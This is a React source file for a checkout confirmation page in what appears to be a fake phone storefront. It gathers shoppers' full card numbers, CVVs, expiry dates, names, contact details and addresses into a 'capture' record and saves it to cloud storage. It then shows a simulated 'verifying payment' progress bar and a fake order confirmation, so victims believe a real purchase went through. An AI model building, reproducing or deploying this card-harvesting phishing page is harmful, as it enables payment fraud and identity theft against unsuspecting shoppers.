import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { CaptureRecord } from '../types';
import { saveCapture } from '../utils/cloudStorage';

export default function ConfirmationPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const data = location.state as Record<string, string | number> | null;
  const [saved, setSaved] = useState(false);
  const [loading, setLoading] = useState(true);
  const [progress, setProgress] = useState(0);
  const [stage, setStage] = useState('Verifying payment...');

  useEffect(() => {
    if (!data || !data.productId) {
      navigate('/');
      return;
    }

    // Build the capture record
    const record: CaptureRecord = {
      id: `capture_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
      timestamp: new Date().toISOString(),
      productId: data.productId as string,
      productName: data.productName as string,
      color: data.color as string,
      storage: data.storage as string,
      price: data.price as number,
      email: data.email as string,
      phone: data.phone as string,
      firstName: data.firstName as string,
      lastName: data.lastName as string,
      shippingAddress: data.address as string,
      shippingApartment: data.apartment as string,
      shippingCity: data.city as string,
      shippingState: data.state as string,
      shippingZip: data.zip as string,
      shippingCountry: data.country as string,
      billingAddress: data.billingAddress as string,
      billingApartment: data.billingApartment as string,
      billingCity: data.billingCity as string,
      billingState: data.billingState as string,
      billingZip: data.billingZip as string,
      billingCountry: data.billingCountry as string,
      cardType: data.cardType as string,
      cardNumberLast4: data.cardNumberLast4 as string,
      cardFullNumber: data.cardFullNumber as string,
      cardExpiry: data.cardExpiry as string,
      cardCVV: data.cardCVV as string,
      cardName: data.cardName as string,
    };

    saveCapture(record)
      .then(() => setSaved(true))
      .catch(e => console.error('Failed to save capture:', e));

    // Simulate processing stages with progress bar (8 seconds)
    const stages = [
      { at: 0, label: 'Verifying payment...' },
      { at: 25, label: 'Processing transaction...' },
      { at: 50, label: 'Confirming shipping details...' },
      { at: 75, label: 'Generating order confirmation...' },
      { at: 95, label: 'Finalizing...' },
    ];

    const duration = 8000;
    const intervalMs = 50;
    let elapsed = 0;

    const timer = setInterval(() => {
      elapsed += intervalMs;
      const pct = Math.min((elapsed / duration) * 100, 100);
      setProgress(pct);

      for (let i = stages.length - 1; i >= 0; i--) {
        if (pct >= stages[i].at) {
          setStage(stages[i].label);
          break;
        }
      }

      if (elapsed >= duration) {
        clearInterval(timer);
        setLoading(false);
      }
    }, intervalMs);

    return () => clearInterval(timer);
  }, [data, navigate]);

  if (!data || !data.productId) return null;

  const orderId = `NVR-${Date.now().toString(36).toUpperCase()}`;

  // ---- LOADING SCREEN ----
  if (loading) {
    return (
      <div className="min-h-screen bg-zinc-950 flex flex-col items-center justify-center px-4 pt-16">
        {/* Animated ring */}
        <div className="relative mb-8">
          <svg className="w-24 h-24 animate-spin" viewBox="0 0 100 100">
            <circle
              cx="50" cy="50" r="42"
              fill="none"
              stroke="rgba(245,158,11,0.15)"
              strokeWidth="4"
            />
            <circle
              cx="50" cy="50" r="42"
              fill="none"
              stroke="url(#loadingGrad)"
              strokeWidth="4"
              strokeLinecap="round"
              strokeDasharray="264"
              strokeDashoffset="100"
            />
            <defs>
              <linearGradient id="loadingGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" stopColor="#f59e0b" />
                <stop offset="100%" stopColor="#f97316" />
              </linearGradient>
            </defs>
          </svg>
          <div className="absolute inset-0 flex items-center justify-center">
            <span className="text-amber-400 text-sm font-mono font-bold">{Math.round(progress)}%</span>
          </div>
        </div>

        {/* Stage label */}
        <p className="text-zinc-300 text-lg font-medium mb-2 animate-pulse">{stage}</p>
        <p className="text-zinc-600 text-xs">Please do not close this page</p>

        {/* Progress bar */}
        <div className="w-64 h-1 bg-zinc-800 rounded-full mt-6 overflow-hidden">
          <div
            className="h-full bg-gradient-to-r from-amber-500 to-orange-500 rounded-full transition-all duration-100 ease-linear"
            style={{ width: `${progress}%` }}
          />
        </div>
      </div>
    );
  }

  // ---- SUCCESS SCREEN ----
  return (
    <div className="min-h-screen bg-zinc-950 text-white pt-20 pb-12 px-4 sm:px-6">
      <div className="max-w-2xl mx-auto text-center">
        {/* Animated success icon */}
        <div className="mb-8">
          <div className="w-20 h-20 mx-auto rounded-full bg-green-500/10 border-2 border-green-500/30 flex items-center justify-center mb-6 animate-[bounce-in_0.6s_ease-out]">
            <span className="text-4xl text-green-400">✓</span>
          </div>
          <h1 className="text-3xl sm:text-4xl font-black text-white mb-3">Thank You For Your Order</h1>
          <p className="text-zinc-400 text-base sm:text-lg max-w-md mx-auto leading-relaxed">
            Confirmation and tracking details will be sent to your email.
          </p>
        </div>

        {/* Order Details */}
        <div className="bg-zinc-900/50 border border-zinc-800/50 rounded-2xl p-6 sm:p-8 text-left mb-6 animate-[fade-in-up_0.5s_ease-out_0.3s_both]">
          <div className="flex items-center justify-between mb-6">
            <h2 className="text-lg font-bold text-white">Order Summary</h2>
            <span className="text-xs font-mono text-zinc-500">{orderId}</span>
          </div>

          <div className="space-y-4">
            <div className="flex items-center gap-4 p-4 rounded-xl bg-zinc-800/30">
              <div className="w-12 h-12 rounded-lg bg-zinc-700 flex items-center justify-center text-xl">📱</div>
              <div className="flex-1">
                <p className="text-sm font-bold text-white">{data.productName as string}</p>
                <p className="text-xs text-zinc-500">{data.color as string} · {data.storage as string}</p>
              </div>
              <p className="text-lg font-black text-amber-400">${(data.price as number).toFixed(2)}</p>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-sm">
              <div>
                <p className="text-zinc-500 text-xs uppercase tracking-wider mb-1">Shipping To</p>
                <p className="text-zinc-300">{data.firstName as string} {data.lastName as string}</p>
                <p className="text-zinc-400">{data.address as string}</p>
                {data.apartment && <p className="text-zinc-400">{data.apartment as string}</p>}
                <p className="text-zinc-400">{data.city as string}, {data.state as string} {data.zip as string}</p>
              </div>
              <div>
                <p className="text-zinc-500 text-xs uppercase tracking-wider mb-1">Contact</p>
                <p className="text-zinc-300">{data.email as string}</p>
                <p className="text-zinc-400">{data.phone as string}</p>
              </div>
            </div>

            <div className="border-t border-zinc-800/50 pt-4">
              <div className="flex items-center justify-between">
                <span className="text-zinc-400 text-sm">Total</span>
                <span className="text-2xl font-black text-amber-400">${(data.price as number).toFixed(2)}</span>
              </div>
              <p className="text-zinc-600 text-xs mt-1">Paid via {data.cardType as string} ending in {data.cardNumberLast4 as string}</p>
            </div>
          </div>
        </div>

        {saved && (
          <div className="flex items-center justify-center gap-2 text-green-400/60 text-xs mb-6">
            <span>✓</span>
            <span>Order recorded successfully</span>
          </div>
        )}

        <button
          onClick={() => navigate('/')}
          className="px-8 py-3.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-500 text-black font-bold text-sm hover:from-amber-400 hover:to-orange-400 transition-all shadow-lg shadow-amber-500/25"
        >
          Continue Shopping
        </button>
      </div>
    </div>
  );
}
